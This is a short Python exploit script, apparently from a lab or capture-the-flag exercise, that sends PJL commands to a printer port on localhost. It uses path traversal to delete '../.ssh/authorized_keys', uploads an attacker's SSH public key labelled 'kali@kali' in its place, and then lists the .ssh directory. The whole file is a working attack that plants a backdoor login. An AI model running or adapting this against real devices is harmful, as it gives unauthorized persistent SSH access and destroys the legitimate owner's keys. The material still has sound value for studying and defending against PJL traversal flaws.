#!/usr/bin/env python3
import socket
import time

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)
PATH = "../.ssh/authorized_keys"

# delete
s = socket.socket()
s.settimeout(3)
s.connect(("127.0.0.1", 9100))
s.sendall(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())
print("del", s.recv(256))
s.close()

hdr = f'@PJL FSUPLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode()
for label, pause in (("together", 0), ("split", 0.2)):
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(hdr)
    if pause:
        time.sleep(pause)
    s.sendall(KEY)
    try:
        r = s.recv(512)
    except socket.timeout:
        r = b"T"
    s.close()
    print(label, r[:100])

s = socket.socket()
s.settimeout(3)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", s.recv(1024))
s.close()